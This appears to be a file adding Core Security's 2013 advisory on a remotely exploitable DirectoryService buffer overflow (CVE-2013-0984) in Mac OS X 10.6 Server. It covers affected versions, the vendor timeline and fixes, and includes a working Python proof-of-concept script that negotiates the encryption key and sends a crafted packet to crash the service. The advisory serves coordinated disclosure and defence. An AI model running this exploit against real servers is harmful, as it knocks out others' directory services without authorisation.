@@ -1,0 +1,374 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Mac OSX Server DirectoryService buffer overflow
+
+
+1. *Advisory Information*
+
+Title: Mac OSX Server DirectoryService buffer overflow
+Advisory ID: CORE-2013-0103
+Advisory URL:
+http://www.coresecurity.com/advisories/mac-osx-server-directoryservice-buffer-overflow
+Date published: 2013-06-04
+Date of last update: 2013-06-04
+Vendors contacted: Apple
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Buffer overflow [CWE-119]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-0984
+
+
+3. *Vulnerability Description*
+
+A memory corruption vulnerability was found in Mac OSX Directory
+Service. By sending a maliciously crafted message, a remote attacker
+could cause the directory server to terminate or execute arbitrary code
+with system privileges. The issue existed in the directory server's
+handling of messages from the network.
+
+
+4. *Vulnerable Packages*
+
+   . Mac OS X 10.6.8 Server (x86_64)
+   . Mac OS X 10.6.7 Server (x86_64)
+   . Mac OS X 10.6.6 Server (x86_64)
+   . Mac OS X 10.6.5 Server (x86_64)
+   . Mac OS X 10.6.4 Server (x86_64)
+   . Mac OS X 10.6.3 Server (x86_64)
+   . Mac OS X 10.6.2 Server (x86_64)
+   . Mac OS X 10.6.1 Server (x86_64)
+   . Mac OS X 10.6.0 Server (x86_64)
+   . Other versions are probably affected too, but they were not checked.
+
+
+5. *Vendor Information, Solutions and Workarounds*
+
+   . Apple security updates are available via the Software Update
+mechanism: http://support.apple.com/kb/HT1338.
+   . Apple security updates are also available for manual download via:
+http://www.apple.com/support/downloads.
+   . For further information regarding this issue visit:
+http://support.apple.com/kb/HT1222.
+   . Vendor also notifies that this issue does not affect OS X Lion or
+OS X Mountain Lion systems.
+
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Nicolas Economou.
+The publication of this advisory was coordinated by Fernando Miranda
+from Core Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+The bug is located in the function 'DSTCPEndpoint::AllocFromProxyStruct'
+from 'DSTCPEndpoint.cpp'[1]. An attacker can control both the value of
+'inProxyDataMsg->fDataSize' and the data that will be copied. Thus, by
+sending a huge amount of data and a small buffer size, the service will
+crash trying to access an unmapped memory block.
+
+
+7.1. *Proof of Concept*
+
+Before running the PoC, make sure you meet the following prerequisites:
+
+   1. The PyCrypto toolkit [2] has to be installed.
+   2. The IP address and port (hardcoded at the end of the file) have to
+point to your server.
+   3. The PoC was tested against a Mac OSX Server 10.6.8 with the last
+security patch installed [3].
+
+/-----
+from Crypto.Cipher import AES
+import socket
+import struct
+import time
+
+def send_packet(sock, data):
+    packet = ""
+    packet += "DSPX"
+    packet += struct.pack(">I", len(data))
+    packet += data
+    sock.send(packet)
+
+
+def get_crypted_data(shared_key, data):
+    cipher = AES.new(shared_key, AES.MODE_CBC, "\x00" * 16)
+    crypted_data = cipher.encrypt(data)
+    return crypted_data
+
+
+def attack(ip, port):
+    try:
+        p = socket.socket()
+        p.connect((ip, port))
+    except Exception, e:
+        print e
+        return
+    data = ""
+    data += "DHN2"
+    data += "\x00" * 63 + "\x02" # Key that generates a DERIVED KEY,
+identical to the one received.
+    # Packet 1
+    print ("\nSending my public key ...")
+    send_packet(p, data)
+    resp = p.recv(65536)
+    # Key sent by server.
+    key_sent = resp[8: len(resp) - 1]
+    server_key = ""
+    # Flip the number.
+    for i in range(len(key_sent) - 1, -1, -1):
+        server_key += key_sent[i]
+    # String to (a huge) number conversion.
+    big_number = ""
+    for c in server_key:
+        big_number += "%.2x" % ord(c)
+    big_number = int(big_number, 16)
+    prime = 2 ** 128
+    # Obtaining the SHARED KEY (To be use for AES encryption).
+    derived_key = pow(big_number, 1, prime)
+    magic_number = derived_key
+    derived_key_string = ""
+    # Transform key into a string.
+    while magic_number != 0:
+        resto = magic_number % 256
+        magic_number /= 256
+        derived_key_string += struct.pack("B", resto)[0]
+    print "shared key: %s" % repr(derived_key_string)
+    # Handshake.
+    print "Sending the Handshaking"
+    data = "A" * 4 + ("\x0c" * 12)
+    crypted_data = get_crypted_data(derived_key_string, data)
+    send_packet(p, crypted_data)
+    resp = p.recv(65536)
+    data = ""
+    data += "A" * 0x1b
+    data += "\x02"
+    data += struct.pack("<I", 0x10000000)       # Evil value.
+    data += struct.pack("<I", 0x100)            # Value to be used by
+the last patched version.
+    data += "A" * ( 0x34 - len(data) )
+    data += struct.pack(">I", 0x1172 + 1)       # Operation code.
+    data += struct.pack(">I", 0x99999999)
+    data += struct.pack(">I", 0x80808080)
+    data += struct.pack(">I", 0x81818181)
+    data += struct.pack(">I", 0x66666666)
+    data += "B" * (0xe0 - len(
+        data))           # Bypass in previous Mac OSX versions ( Integer
+underflow -> ( ( 0xe0 + 0x10 ) - 0x100 )
+    data += "\x00" * 16
+    crypted_data = get_crypted_data(derived_key_string, data)
+    # TRIGGER
+    print ( "Sending the evil packet" )
+    send_packet(p, crypted_data)
+    p.settimeout(10)
+    try:
+        p.recv(65536)
+    except Exception, e:
+        print e
+    p.close()
+    try:
+        print ( "\nwaiting 10 seconds for check ..." )
+        time.sleep(10)
+        p = socket.socket()
+        p.settimeout(10)
+        p.connect(( ip, port ))
+    except Exception:
+        print ( "\nThe attack was successful !\n" )
+        return
+    print ( "\nThe attack wasn't successful\n" )
+    return
+
+
+ip = "192.168.100.1"
+port = 625
+attack(ip, port)
+
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-01-09:
+Core Security Technologies notifies Apple Product Security of the
+vulnerability and sends technical details and a PoC to reproduce the
+issue. Publication date is set for Feb 19th, 2013.
+
+. 2013-01-10:
+Apple Product Security acknowledges reception of the advisory (id
+250731893 assigned).
+
+. 2013-02-01:
+Core asks Apple Product Security if they were able to reproduce the
+issue and requests a status update.
+
+. 2013-02-05:
+The Apple Product Security team notifies that they were able to
+reproduce the issue and asks to delay the advisory publication until
+they were able to ship a security update.
+
+. 2013-02-19:
+First release date missed.
+
+. 2013-02-25:
+Core notifies that release dates can be re-scheduled based on concrete
+and detailed information about vendor plans to produce a fix, but Core
+has not received that information from Apple yet.
+
+. 2013-02-28:
+Vendor notifies that they are still working on fixing the issue and the
+current best estimate for releasing a patch is late April.
+
+. 2013-03-05:
+Core re-schedules the advisory publication for April 30th and asks for
+detailed technical information.
+
+. 2013-03-08:
+Vendor notifies that the issue affects Mac OS X Snow Leopard Server
+only. Code execution may theoretically be possible but Apple Product
+Security team was not able to do so.
+
+. 2013-04-22:
+Core asks for a status update.
+
+. 2013-04-24:
+Vendor estimates that they will address this issue in early May.
+
+. 2013-04-30:
+Second release date missed.
+
+. 2013-04-30:
+Core notifies that the second release date was missed and that the
+advisory publication can be re-scheduled if Apple provides enough
+feedback and technical information for justifying that decision: 1. For
+what reasons Apple was not able to release the update at the end of
+April as planned? 2. What is the status of next security update? 3. What
+is the new tentative release date? 4. Is a patch available for test it?
+
+. 2013-05-02:
+Vendor notifies that the reported issue is addressed in the upcoming
+security update for Mac OS X Snow Leopard, targeted for mid-May.
+
+. 2013-05-02:
+Core re-schedules the advisory publication for May 14th.
+
+. 2013-05-02:
+Vendor sends an invitation to join in to the Apple Software Customer
+Seeding program [4] for pre-release access to builds of this security
+update.
+
+. 2013-05-07:
+Third release date missed.
+
+. 2013-05-13:
+Core asks if the tentative release date of Mid May still stands.
+
+. 2013-05-14:
+Fourth release date missed.
+
+. 2013-05-15:
+Vendor notifies that the upcoming update addresses a considerable number
+of security issues and the release has to be postponed. Vendor notifies
+they will communicate a tentative release days in the next few days.
+
+. 2013-05-27:
+Core asks for a release date and notifies that the advisory was
+re-scheduled for Jun 6th; this date should be considered final unless
+vendor provides a clear timeline to justify keep delaying the release.
+
+. 2013-05-29:
+Vendor notifies that they are still waiting a confirmation from CORE
+Security that the update they seeded [2013-05-02] addresses the reported
+issue.
+
+. 2013-05-29:
+Core notifies that being part of Apple beta test program was never
+requested and asks for a CVE number and a confirmed release date.
+
+. 2013-05-30:
+Vendor notifies that the invitation to the Apple Software Customer
+Seeding [4] was sent because Core requested a patch for testing on
+[2013-04-30]. Vendor asks if Core has already completed the patch
+testing process.
+
+. 2013-05-30:
+Core notifies that it was not possible to download the patch from the
+location provided by Apple and no more time nor resources can be spent
+on this case. Core also notified that this case was reported 5 months
+ago and 4 release dates were missed: Feb 19th, late April, early May and
+mid-May. Additionally, in the last weeks Core asked for a release date
+several times but did not receive any answer. For those reasons, Core
+confirms the release date of Jun 6th.
+
+. 2013-05-31:
+Vendor notifies that the security update is on track for releasing next
+week and assigns CVE-2013-0984 for this issue. Vendor changes the
+vulnerability impact from DoS to code-execution.
+
+. 2013-06-04:
+Vendor notifies that the security update was released.
+
+. 2013-06-04:
+Advisory CORE-2013-0103 released.
+
+
+9. *References*
+
+[1]
+http://opensource.apple.com/source/DirectoryService/DirectoryService-621/Proxy/DSTCPEndpoint.cpp
+[2] https://www.dlitz.net/software/pycrypto/
+[3] http://support.apple.com/kb/HT5501 - DirectoryService
+[4] https://appleseed.apple.com
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2012 Core Security
+Technologies and (c) 2012 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
